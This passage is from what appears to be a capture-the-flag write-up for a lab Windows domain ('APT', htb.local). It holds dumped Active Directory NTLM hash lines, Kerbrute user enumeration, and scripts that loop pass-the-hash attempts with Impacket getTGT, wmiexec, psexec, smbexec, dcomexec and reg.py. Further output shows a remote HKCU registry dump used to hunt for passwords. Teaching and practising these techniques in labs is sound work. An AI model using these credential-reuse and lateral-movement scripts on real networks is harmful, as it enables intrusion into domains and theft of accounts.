julee.curry:3214:aad3b435b51404eeaad3b435b51404ee:5feeeb99edfa4c0e1a3674459321b143:::
lavina.ellison:3215:aad3b435b51404eeaad3b435b51404ee:0d7bddb6e81ce55420b0fe075fa26758:::
rois.cabrera:3216:aad3b435b51404eeaad3b435b51404ee:fcd3287c43fc4d16c498f7c25e0773d1:::
melvin.cantu:3217:aad3b435b51404eeaad3b435b51404ee:727e272a654df4188c4bb27f97ee97ba:::
badri.maynard:3218:aad3b435b51404eeaad3b435b51404ee:9d6c6eb8366c4445a715f86eb77d8125:::
peregrine.cooper:3219:aad3b435b51404eeaad3b435b51404ee:bf6fe413edb71c0cb36cda7d8a556359:::
jemmy.fulton:3220:aad3b435b51404eeaad3b435b51404ee:4fd8ce6644522dab686ebef9fcb020ce:::
christabella.wells:3221:aad3b435b51404eeaad3b435b51404ee:ac2515432deb820d9ee0fba201df4ea6:::
katleen.mccullough:3222:aad3b435b51404eeaad3b435b51404ee:4bf0bf66851db901f83fcd62310d6307:::
chris.simmons:3223:aad3b435b51404eeaad3b435b51404ee:0c9ef87603f3e43b8b2c9a0ed5595cc9:::
myrle.waters:3224:aad3b435b51404eeaad3b435b51404ee:fa1697a4c1dbcb33bb7d9118a389b8bc:::
tristan.mcdonald:3225:aad3b435b51404eeaad3b435b51404ee:14490d8d1316e922c4afc2edb0c8cee1:::
evan.salazar:3226:aad3b435b51404eeaad3b435b51404ee:561d19bc4bb4c49adc472f6d79ef8304:::
maroun.copeland:3227:aad3b435b51404eeaad3b435b51404ee:5ce984d5d4982561f1bfa0e98d174186:::
lsi.olson:3228:aad3b435b51404eeaad3b435b51404ee:28eaf861ed7d2c6b72060941cd4bd5e7:::
anabal.sanders:3229:aad3b435b51404eeaad3b435b51404ee:a4c6285d3b3e6926829ef805e35335b9:::
cian.fisher:3230:aad3b435b51404eeaad3b435b51404ee:76e26037623cca68e2c6796fd37e1931:::
pauli.guerra:3231:aad3b435b51404eeaad3b435b51404ee:610418a2e7b9d71234d05ecd1d3a7943:::
edin.wolf:3232:aad3b435b51404eeaad3b435b51404ee:517c83150c63f98df8096d820cc4c68f:::
kristin.horn:3233:aad3b435b51404eeaad3b435b51404ee:69fcd19c212124d3e73c2d078c0b5895:::
rhonda.wiley:3234:aad3b435b51404eeaad3b435b51404ee:4fd07cc3f5224fdf3f6e5aacbd0bcc27:::
lorry.moon:3235:aad3b435b51404eeaad3b435b51404ee:d7db837aae833bed26aad3b8b1ba8cf4:::
tod.obrien:3236:aad3b435b51404eeaad3b435b51404ee:5a2998097c09fa8604c6acd88910f89d:::
yana.farley:3237:aad3b435b51404eeaad3b435b51404ee:3bdb049042a186b7ff83c7574ccc532d:::
sik-yin.sims:3238:aad3b435b51404eeaad3b435b51404ee:7a6feee29ba3c445db5a10f0353e8c50:::
candice.davenport:3239:aad3b435b51404eeaad3b435b51404ee:46d3cdb1acbfdccff9c57eb02874c403:::
lianne.conway:3240:aad3b435b51404eeaad3b435b51404ee:b3f2b97763bd8f53f56ca9c1727357a2:::
robena.burton:3241:aad3b435b51404eeaad3b435b51404ee:a4befdf73f72b44c621c3da95de9835b:::
nixie.mclaughlin:3242:aad3b435b51404eeaad3b435b51404ee:3ed0ab610f5eef92f3b1343dd61e882a:::
vikki.dorsey:3243:aad3b435b51404eeaad3b435b51404ee:8076c10bf1514748bb0a05d5f82d0f9d:::
lonneke.haney:3244:aad3b435b51404eeaad3b435b51404ee:6a363e2ada519ac7e9fc5137ac13c75e:::
pepita.hendricks:3245:aad3b435b51404eeaad3b435b51404ee:3c4ff0f4e5c2bf908796e6c498433350:::
amandie.anderson:3246:aad3b435b51404eeaad3b435b51404ee:5ee2363fe8291b665ddff5ad6c309713:::
correna.butler:3247:aad3b435b51404eeaad3b435b51404ee:2ad35c860cca8b5555d6bf893c9eaa23:::
anais.cole:3248:aad3b435b51404eeaad3b435b51404ee:bbd9ce5c6d5294d64438377400011829:::
shabbir.kennedy:3249:aad3b435b51404eeaad3b435b51404ee:a5910545d6875f444cdd106f4498f313:::
ermina.mills:3250:aad3b435b51404eeaad3b435b51404ee:7f72b43c8c82710bee7a7d65e963cb78:::
olympe.payne:3251:aad3b435b51404eeaad3b435b51404ee:c207b3b7013a9341ac9a704ef18baf9e:::
shena.rosario:3252:aad3b435b51404eeaad3b435b51404ee:40f598371f1ccab022eafd5f7ee09192:::
harlie.butler:3253:aad3b435b51404eeaad3b435b51404ee:276ccd7eca0b3e95741d13cbd4c879e6:::
nani.maddox:3254:aad3b435b51404eeaad3b435b51404ee:36e2f3f576b62df4d2e6f34105d36ef0:::
glendon.vasquez:3255:aad3b435b51404eeaad3b435b51404ee:bebff950776e4cc3ab3eb9d12c5c1623:::
elysia.hutchinson:3256:aad3b435b51404eeaad3b435b51404ee:164699a6db37b6ccd332dac2f325f629:::
izzie.roach:3257:aad3b435b51404eeaad3b435b51404ee:8852f508ec1dde36c95fb08f7063522d:::
bert.parks:3258:aad3b435b51404eeaad3b435b51404ee:5ca354b921fd63954c822f34b921c4a6:::
viktor.dillard:3259:aad3b435b51404eeaad3b435b51404ee:9c2a700bce2d6c38c7dcd0d2e5dc419b:::
alphonso.cline:3260:aad3b435b51404eeaad3b435b51404ee:d9a6878e5deed4ab9205c4d7b910c31f:::
christiane.sosa:3261:aad3b435b51404eeaad3b435b51404ee:5b2b442b58832e80b973e5a8bb894b18:::
mitsuko.padilla:3262:aad3b435b51404eeaad3b435b51404ee:2386e9abcee50942e53f8110fde1b519:::
haden.webster:3263:aad3b435b51404eeaad3b435b51404ee:6ab30111bd620eb161a19538cf8e8ef4:::
clair.fitzpatrick:3264:aad3b435b51404eeaad3b435b51404ee:a9f1c7a066a720581531acddda59fafc:::
ty.graham:3265:aad3b435b51404eeaad3b435b51404ee:616f18bb7f513f23e3610656ac2bd024:::
dinny.kelley:3266:aad3b435b51404eeaad3b435b51404ee:c91bc81efa14000930b66ba5ec02a939:::
shiloh.hines:3267:aad3b435b51404eeaad3b435b51404ee:3a8107c1142f2b732f6a2e8861395659:::
ibrahim.willis:3268:aad3b435b51404eeaad3b435b51404ee:a9783edf57fb2754fdca452e32858bf6:::
kaia.atkinson:3269:aad3b435b51404eeaad3b435b51404ee:caefca493d458ce50558e714ea0c7848:::
marcie.stewart:3270:aad3b435b51404eeaad3b435b51404ee:0fabba9f122f94119b2ae81d47ea95f9:::
gerianna.thomas:3271:aad3b435b51404eeaad3b435b51404ee:931849b79fa2d8e97b59571a84628480:::
maurise.summers:3272:aad3b435b51404eeaad3b435b51404ee:b2118afee1f2e48248ae6616c2d8b12c:::
mela.ross:3273:aad3b435b51404eeaad3b435b51404ee:0b1b15f600aa899d1420c3ba9b35c1b5:::
delanie.olsen:3274:aad3b435b51404eeaad3b435b51404ee:aaef700698a0560a577c7f9c5efe9fee:::
jaqueline.faulkner:3275:aad3b435b51404eeaad3b435b51404ee:e430eedce343d6dfa3931341fae7a162:::
harvey.love:3276:aad3b435b51404eeaad3b435b51404ee:4f7383be45a048c5bfb31728aa152630:::
nieve.cooke:3277:aad3b435b51404eeaad3b435b51404ee:860304eee60f79c58b624a05fb093421:::
pet.wheeler:3278:aad3b435b51404eeaad3b435b51404ee:4ee758e19e9a6dafcda2f4e2dc5a0001:::
kristi.stanley:3279:aad3b435b51404eeaad3b435b51404ee:861969fbb6bd1cec3a79fac7f094754d:::
linzy.phelps:3280:aad3b435b51404eeaad3b435b51404ee:cee3f4959173432fba09ea2a6d2d40a5:::
arlinda.spears:3281:aad3b435b51404eeaad3b435b51404ee:6f57182977b448629cb8b49481086e45:::
cassandre.foreman:3282:aad3b435b51404eeaad3b435b51404ee:6c102c9bfb19f1db800f841fcb1763fb:::
bambi.kirkland:3283:aad3b435b51404eeaad3b435b51404ee:082217eea7d6f2657cf15f12479b8bd1:::
alena.melton:3284:aad3b435b51404eeaad3b435b51404ee:9d963ec57fc8a911164b666403659061:::
caine.romero:3285:aad3b435b51404eeaad3b435b51404ee:b6fb8877d5e570714e1417668542e716:::
eli.solis:3286:aad3b435b51404eeaad3b435b51404ee:1beb1034b9d34b3e13d7c2b72e7ea07d:::
adie.trevino:3287:aad3b435b51404eeaad3b435b51404ee:bb425d2a837c249d929f8421ac36714f:::
valentino.nash:3288:aad3b435b51404eeaad3b435b51404ee:c5b24a21ae50804ccabe2dee561bd4a0:::
barbara-anne.palmer:3289:aad3b435b51404eeaad3b435b51404ee:6fbd7fedb33c9c09ad53cbbbac3f7ce3:::
dashawn.thornton:3290:aad3b435b51404eeaad3b435b51404ee:31a06ad8e493aeabe80913a726941ea5:::
david.abbott:3291:aad3b435b51404eeaad3b435b51404ee:12f0901a386630dead0858fdd37e48f3:::
brittany.gillespie:3292:aad3b435b51404eeaad3b435b51404ee:5fb20bd41b7dfe55602b6f3baa9d602f:::
flor.larsen:3293:aad3b435b51404eeaad3b435b51404ee:4456799638aa1737658d2a1c911883d1:::
marline.whitney:3294:aad3b435b51404eeaad3b435b51404ee:19bb518f0410dc882cc9d106d73ae0a5:::
marguerita.gregory:3295:aad3b435b51404eeaad3b435b51404ee:7c8ad958b770a73bc79b4e4e4c73be48:::
twana.flowers:3296:aad3b435b51404eeaad3b435b51404ee:e4e0839ead3a07148ae359e99ea79b43:::
florance.riley:3297:aad3b435b51404eeaad3b435b51404ee:5645cd7f3c800e01ae00d0523a257175:::
miller.salas:3298:aad3b435b51404eeaad3b435b51404ee:6f80e850da1a955cc072fc38c0873786:::
georgianna.duffy:3299:aad3b435b51404eeaad3b435b51404ee:6b09aabf7861ca522e9058471e4e0be7:::
phuong.conway:3300:aad3b435b51404eeaad3b435b51404ee:a5ddbd0cf46dce170faabf8026c2eec9:::
kendra.vargas:3301:aad3b435b51404eeaad3b435b51404ee:d55598dece324f82db55b179eb1345a2:::
abriel.donaldson:3302:aad3b435b51404eeaad3b435b51404ee:8167d404defe69e45bae401b0640294b:::
edel.le:3303:aad3b435b51404eeaad3b435b51404ee:bb747131b54185d9388f480c95fb2f06:::
tetsuya.banks:3304:aad3b435b51404eeaad3b435b51404ee:761d921bca62a4c7b9a8ee4bc8d58ebf:::
minetta.clarke:3305:aad3b435b51404eeaad3b435b51404ee:b3270340b7733c4b6251022fad4f29b6:::
wesley.english:3306:aad3b435b51404eeaad3b435b51404ee:b78d78a6036649bc12c5f534ead9a322:::
butch.cummings:3307:aad3b435b51404eeaad3b435b51404ee:502884aaef5e8d88946e6728b7b72f21:::

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/APT]
└─$ grep ':::' backup_ad_dump | wc -l
2000

```

Used that to get the clean users.list

```
lorette.bird
detlev.castillo
bobbie.schwartz
ninon.henson
elzbieta.kaufman
ekaterina.rivas
lizzy.martin
francis.copeland
maryl.flowers
zoe.delaney
melba.bailey
reva.benjamin
tanisha.velasquez
lovina.patterson
anson.pruitt
tristen.sharp
emalia.hunt
pricing.conway
darell.randolph
rhiannon.phillips
nel.swanson
janna.espinoza
rylan.harding
lindsey.giles
amata.walter
magdalene.abbott
griffin.long
marisa.hawkins
igor.cervantes
yu-kai.decker
marjoke.young
kinna.puckett
jacquetta.rodriguez
martica.hall
emma.hansen
tiff.martin
seiji.holland
parker.goodwin
cuong.pierce
prue.olson
                                                                                                                                
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/APT]
└─$ grep ':::' backup_ad_dump | awk -F':' '{print $1}' > ../users   

```

With 2000 users, I need a way to check how much of this is valid. Because Kerberos is available on IPv6 (TCP 88), I can use [Kerbrute](https://github.com/ropnop/kerbrute) to check the users. I’ll get a list of just the users:

{{< toggle "Tag 🏷️" >}}

{{< tag "Port88-LDAP-Kerbrute-users-verify" >}} Need to use the Kerbrute to verify the user account so that we will not be blocked by the try limit. and the users list is from the backup file dump out

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/kerbrute]
└─$ ./kerbrute userenum -d htb.local --dc APT.htb.local users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 05/16/26 - Ronnie Flathers @ropnop

2026/05/16 19:43:12 >  Using KDC(s):
2026/05/16 19:43:12 >   APT.htb.local:88

2026/05/16 19:43:18 >  [+] VALID USERNAME:       Administrator@htb.local
2026/05/16 19:43:18 >  [+] VALID USERNAME:       APT$@htb.local
2026/05/16 19:47:21 >  [+] VALID USERNAME:       henry.vinson@htb.local
2026/05/16 20:01:16 >  Done! Tested 2000 usernames (3 valid) in 1083.335 seconds
                                                                                                          
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/kerbrute]

```

### getST.py

{{< toggle "Tag 🏷️" >}}

{{< tag "Port88-LDAP-getST" >}} Due to the the box is blocking the account brute force , so using the getST.py with the hashes to do account brute force ( bruteforce ) to have the ticket , so I will create the script to loop it .

{{< /toggle >}}

Valid account with kerbrute

```
Administrator@htb.local
APT$@htb.local
henry.vinson@htb.local
```

Valid hashes from backup\_ad\_dump

```
aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb
```

if successful

```
┌──(root㉿kali)-[~/Desktop]
└─# /usr/share/doc/python3-impacket/examples/getTGT.py htb.local/henry.vinson -hashes :e53d87d42adaa3ca32bdb34a876cbffb                    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in henry.vinson.ccache

```

if failed

```
┌──(root㉿kali)-[~/Desktop]
└─# /usr/share/doc/python3-impacket/examples/getTGT.py htb.local/henry.vinson -hashes :e53d87d42adaa3ca32bdb34a876cbfaa 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)

```

`getTGT_auto`, change the user of  henry.vinson

```
sudo vim getTGT_auto

#!/bin/bash 

while IFS='' read -r LINE || [ -n "${LINE}" ]
do
	echo "------"
	echo "using the Hash:${LINE}"
	/usr/share/doc/python3-impacket/examples/getTGT.py htb.local/henry.vinson@htb.local -hashes ${LINE}
done < hash_list
```

```
┌──(root㉿kali)-[~/Desktop]
└─# /usr/share/doc/python3-impacket/examples/getTGT.py htb.local/henry.vinson -hashes :e53d87d42adaa3ca32bdb34a876cbffb                    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in henry.vinson.ccache

```

```
┌──(root㉿kali)-[~/Desktop]
└─# klist henry.vinson.ccache 
Ticket cache: FILE:henry.vinson.ccache
Default principal: henry.vinson@HTB.LOCAL

Valid starting       Expires              Service principal
05/18/2026 02:04:05  05/18/2026 12:04:05  krbtgt/HTB.LOCAL@HTB.LOCAL
        renew until 05/19/2026 02:04:06

```

hash\_brute\_force\_account.sh

```
#!/bin/bash

HASHES='aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb'
DOMAIN='htb.local'
USER='henry.vinson'
TARGET='htb.local'
CMD='whoami'


/usr/share/doc/python3-impacket/examples/wmiexec.py  -hashes  $HASHES
/usr/share/doc/python3-impacket/examples/psexec.py  -hashes $HASHES
/usr/share/doc/python3-impacket/examples/smbexec.py  -hashes $HASHES
/usr/share/doc/python3-impacket/examples/dcomexec.py  -hashes $HASHES
evil-winrm 
reg.py -hashes $HASHES
```

Lateral-Movement-account-verify-hashes-wmiexec-psexec-smbexec-dcomexec-reg

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-account-verify-hashes-wmiexec-psexec-smbexec-dcomexec-reg" >}} With the valid hashes and user to test which tools is ready to next step

{{< /toggle >}}

```
#!/bin/bash

HASHES='aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb'
DOMAIN='htb.local'
USER='henry.vinson'
TARGET='htb.local'
IMPACKET='/usr/share/doc/python3-impacket/examples'

# ── 1: wmiexec - remote cmd via WMI ──────────────────────────────────────────
CMD1="python3 $IMPACKET/wmiexec.py -hashes $HASHES $DOMAIN/$USER@$TARGET 'whoami'"
echo "[1] $CMD1"
eval "$CMD1" 2>&1
echo ""

# ── 2: psexec - remote cmd via writable SMB share ────────────────────────────
CMD2="python3 $IMPACKET/psexec.py -hashes $HASHES $DOMAIN/$USER@$TARGET 'whoami'"
echo "[2] $CMD2"
eval "$CMD2" 2>&1
echo ""

# ── 3: smbexec - remote cmd via SMB service ──────────────────────────────────
CMD3="python3 $IMPACKET/smbexec.py -hashes $HASHES $DOMAIN/$USER@$TARGET"
echo "[3] $CMD3"
eval "$CMD3" 2>&1
echo ""

# ── 4: dcomexec - remote cmd via DCOM MMC20 ──────────────────────────────────
CMD4="python3 $IMPACKET/dcomexec.py -hashes $HASHES $DOMAIN/$USER@$TARGET 'whoami'"
echo "[4] $CMD4"
eval "$CMD4" 2>&1
echo ""


# ── 6: reg.py - read remote registry key over SMB ────────────────────────────
CMD6="python3 $IMPACKET/reg.py -hashes $HASHES -dc-ip $TARGET $DOMAIN/$USER@$TARGET query -keyName 'HKCU\' "
echo "[6] $CMD6"
eval "$CMD6" 2>&1
echo ""

```

```
┌──(root㉿kali)-[~/Desktop]
└─# ./hash_brute_force_account.sh  
[1] python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@htb.local 'whoami'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

[2] python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@htb.local 'whoami'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on htb.local.....
[-] share 'backup' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.

[3] python3 /usr/share/doc/python3-impacket/examples/smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@htb.local
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 

[4] python3 /usr/share/doc/python3-impacket/examples/dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@htb.local 'whoami'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[-] rpc_s_access_denied

[6] python3 /usr/share/doc/python3-impacket/examples/reg.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName 'HKCU\' 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
HKCU\
HKCU\\Console
HKCU\\Control Panel
HKCU\\Environment
HKCU\\Keyboard Layout
HKCU\\Network
HKCU\\Software
HKCU\\System
HKCU\\Volatile Environment


```

By using these lateral movement tools, we finally succeeded in obtaining registry information using the username and hash at the reg.py script. By registering and enumerating the registry information, we eventually found the username and password.

### Reg enumeration

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-registry-enum" >}} using the reg.py to enum the windows registry reg , found the HKCU \ is vaild key , and I will use the script to dump the data and use the kali terminal search function to find the password

{{< /toggle >}}

```
HKCU\
HKCU\\Console
HKCU\\Control Panel
HKCU\\Environment
HKCU\\Keyboard Layout
HKCU\\Network
HKCU\\Software
HKCU\\System
HKCU\\Volatile Environment
```

```
python3 /usr/share/doc/python3-impacket/examples/reg.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName 'HKCU\Console' 
```

`query_hkcu.sh`

```
┌──(root㉿kali)-[~/Desktop]
└─# cat query_hkcu.sh                
#!/bin/bash

# ─── Configuration ────────────────────────────────────────────────────────────
HASHES="aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb"
DC_IP="htb.local"
TARGET="htb.local/henry.vinson@htb.local"
REG_PY="/usr/share/doc/python3-impacket/examples/reg.py"

KEYS=(
    "HKCU\\Console"
    "HKCU\\Control Panel"
    "HKCU\\Environment"
    "HKCU\\Keyboard Layout"
    "HKCU\\Network"
    "HKCU\\Software"
    "HKCU\\System"
    "HKCU\\Volatile Environment"
)

OUTPUT_DIR="./hkcu_dump"
mkdir -p "$OUTPUT_DIR"

# ─── Query Loop ───────────────────────────────────────────────────────────────
for KEY in "${KEYS[@]}"; do
    # Build a safe filename from the key (replace backslash and spaces)
    SAFE_NAME=$(echo "$KEY" | sed 's/\\/__/g; s/ /_/g')
    OUT_FILE="$OUTPUT_DIR/${SAFE_NAME}.txt"

    echo "[*] Querying: $KEY"
    python3 "$REG_PY" \
        -hashes "$HASHES" \
        -dc-ip "$DC_IP" \
        "$TARGET" query \
        -keyName "$KEY" \
        -s \
        2>&1 | tee "$OUT_FILE"

    echo "[+] Saved → $OUT_FILE"
    echo "──────────────────────────────────────────────────"
done

echo ""
echo "[✓] All keys queried. Results saved in: $OUTPUT_DIR/"

```

```
┌──(root㉿kali)-[~/Desktop]
└─# ./query_hkcu.sh 
[*] Querying: HKCU\Console
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
Console\%SystemRoot%_System32_WindowsPowerShell_v1.0_powershell.exe\
        ColorTable05    REG_DWORD        0x562401
        ColorTable06    REG_DWORD        0xf0edee
        FaceName        REG_SZ   Lucida Console
        FontFamily      REG_DWORD        0x36
        FontWeight      REG_DWORD        0x190
        PopupColors     REG_DWORD        0xf3
        QuickEdit       REG_DWORD        0x1
        ScreenBufferSize        REG_DWORD        0xbb80078
        ScreenColors    REG_DWORD        0x56
        WindowSize      REG_DWORD        0x320078
Console\%SystemRoot%_SysWOW64_WindowsPowerShell_v1.0_powershell.exe\
        ColorTable05    REG_DWORD        0x562401
        ColorTable06    REG_DWORD        0xf0edee
        FaceName        REG_SZ   Lucida Console
        FontFamily      REG_DWORD        0x36
        FontWeight      REG_DWORD        0x190
        PopupColors     REG_DWORD        0xf3
        QuickEdit       REG_DWORD        0x1
        ScreenBufferSize        REG_DWORD        0xbb80078
        ScreenColors    REG_DWORD        0x56
        WindowSize      REG_DWORD        0x320078
[+] Saved → ./hkcu_dump/HKCU__Console.txt
──────────────────────────────────────────────────
[*] Querying: HKCU\Control Panel
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
Control Panel\Accessibility\
        MessageDuration REG_DWORD        0x5
        MinimumHitRadius        REG_DWORD        0x0
Control Panel\Accessibility\On\
        Locale  REG_DWORD        0x0
        On      REG_DWORD        0x0
Control Panel\Colors\
        Background      REG_SZ   0 0 0
        Scrollbar       REG_SZ   200 200 200
        ActiveTitle     REG_SZ   153 180 209
        InactiveTitle   REG_SZ   191 205 219
        Menu    REG_SZ   240 240 240
        Window  REG_SZ   255 255 255
        WindowFrame     REG_SZ   100 100 100
        MenuText        REG_SZ   0 0 0
        WindowText      REG_SZ   0 0 0
        TitleText       REG_SZ   0 0 0
        ActiveBorder    REG_SZ   180 180 180
        InactiveBorder  REG_SZ   244 247 252
        AppWorkspace    REG_SZ   171 171 171
        Hilight REG_SZ   0 120 215
        HilightText     REG_SZ   255 255 255
        ButtonFace      REG_SZ   240 240 240
        ButtonShadow    REG_SZ   160 160 160
        GrayText        REG_SZ   109 109 109
        ButtonText      REG_SZ   0 0 0
        InactiveTitleText       REG_SZ   0 0 0
        ButtonHilight   REG_SZ   255 255 255
        ButtonDkShadow  REG_SZ   105 105 105
        ButtonLight     REG_SZ   227 227 227
        InfoText        REG_SZ   0 0 0
        InfoWindow      REG_SZ   255 255 225
        ButtonAlternateFace     REG_SZ   0 0 0
        HotTrackingColor        REG_SZ   0 102 204
        GradientActiveTitle     REG_SZ   185 209 234
        GradientInactiveTitle   REG_SZ   215 228 242
        MenuHilight     REG_SZ   0 120 215
        MenuBar REG_SZ   240 240 240
Control Panel\Cursors\
        ContactVisualization    REG_DWORD        0x1
        GestureVisualization    REG_DWORD        0x1f
Control Panel\Desktop\
        ActiveWndTrackTimeout   REG_DWORD        0x0
        BlockSendInputResets    REG_SZ   0
        CaretWidth      REG_DWORD        0x1
        ClickLockTime   REG_DWORD        0x4b0
        CoolSwitchColumns       REG_SZ   7
        CoolSwitchRows  REG_SZ   3
        CursorBlinkRate REG_SZ   530
        DockMoving      REG_SZ   1
        DragFromMaximize        REG_SZ   1
        DragFullWindows REG_SZ   0
        DragHeight      REG_SZ   4
        DragWidth       REG_SZ   4
        FocusBorderHeight       REG_DWORD        0x1
        FocusBorderWidth        REG_DWORD        0x1
        FontSmoothing   REG_SZ   2
        FontSmoothingGamma      REG_DWORD        0x0
        FontSmoothingOrientation        REG_DWORD        0x1
        FontSmoothingType       REG_DWORD        0x2
        ForegroundFlashCount    REG_DWORD        0x7
        ForegroundLockTimeout   REG_DWORD        0x30d40
        LeftOverlapChars        REG_SZ   3
        MenuShowDelay   REG_SZ   400
        MouseWheelRouting       REG_DWORD        0x2
        PaintDesktopVersion     REG_DWORD        0x0
        Pattern REG_DWORD        0x0
        RightOverlapChars       REG_SZ   3
        SnapSizing      REG_SZ   1
        TileWallpaper   REG_SZ   0
        WallpaperOriginX        REG_DWORD        0x0
        WallpaperOriginY        REG_DWORD        0x0
        WallpaperStyle  REG_SZ   10
        WheelScrollChars        REG_SZ   3
        WheelScrollLines        REG_SZ   3
        WindowArrangementActive REG_SZ   1
        Win8DpiScaling  REG_DWORD        0x0
        DpiScalingVer   REG_DWORD        0x1000
        UserPreferencesMask     REG_BINARY       
        0000   90 12 03 80 10 00 00 00                            ........
Control Panel\Desktop\Colors\
        ActiveBorder    REG_SZ   212 208 200
        ActiveTitle     REG_SZ   10 36 106
        AppWorkSpace    REG_SZ   128 128 128
        ButtonAlternateFace     REG_SZ   181 181 181
        ButtonDkShadow  REG_SZ   64 64 64
        ButtonFace      REG_SZ   212 208 200
        ButtonHiLight   REG_SZ   255 255 255
        ButtonLight     REG_SZ   212 208 200
        ButtonShadow    REG_SZ   128 128 128
        ButtonText      REG_SZ   0 0 0
        GradientActiveTitle     REG_SZ   166 202 240
        GradientInactiveTitle   REG_SZ   192 192 192
        GrayText        REG_SZ   128 128 128
        Hilight REG_SZ   10 36 106
        HilightText     REG_SZ   255 255 255
        HotTrackingColor        REG_SZ   0 0 128
        InactiveBorder  REG_SZ   212 208 200
        InactiveTitle   REG_SZ   128 128 128
        InactiveTitleText       REG_SZ   212 208 200
        InfoText        REG_SZ   0 0 0
        InfoWindow      REG_SZ   255 255 255
        Menu    REG_SZ   212 208 200
        MenuText        REG_SZ   0 0 0
        Scrollbar       REG_SZ   212 208 200
        TitleText       REG_SZ   255 255 255
        Window  REG_SZ   255 255 255
        WindowFrame     REG_SZ   0 0 0
        WindowText      REG_SZ   0 0 0
Control Panel\Desktop\LanguageConfiguration\
Control Panel\Desktop\WindowMetrics\
        BorderWidth     REG_SZ   -15
        CaptionFont     REG_BINARY       
        0000   F4 FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0010   90 01 00 00 00 00 00 01  00 00 05 00 53 00 65 00   ............S.e.
        0020   67 00 6F 00 65 00 20 00  55 00 49 00 00 00 00 00   g.o.e. .U.I.....
        0030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0050   00 00 00 00 00 00 00 00  00 00 00 00               ............
        CaptionHeight   REG_SZ   -330
        CaptionWidth    REG_SZ   -330
        IconFont        REG_BINARY       
        0000   F4 FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0010   90 01 00 00 00 00 00 01  00 00 05 00 53 00 65 00   ............S.e.
        0020   67 00 6F 00 65 00 20 00  55 00 49 00 00 00 00 00   g.o.e. .U.I.....
        0030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0050   00 00 00 00 00 00 00 00  00 00 00 00               ............
        IconTitleWrap   REG_SZ   1
        MenuFont        REG_BINARY       
        0000   F4 FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0010   90 01 00 00 00 00 00 01  00 00 05 00 53 00 65 00   ............S.e.
        0020   67 00 6F 00 65 00 20 00  55 00 49 00 00 00 00 00   g.o.e. .U.I.....
        0030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0050   00 00 00 00 00 00 00 00  00 00 00 00               ............
        MenuHeight      REG_SZ   -285
        MenuWidth       REG_SZ   -285
        MessageFont     REG_BINARY       
        0000   F4 FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0010   90 01 00 00 00 00 00 01  00 00 05 00 53 00 65 00   ............S.e.
        0020   67 00 6F 00 65 00 20 00  55 00 49 00 00 00 00 00   g.o.e. .U.I.....
        0030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ................
        0050   00 00 00 00 00 00 00 00  00 00 00 00               ............
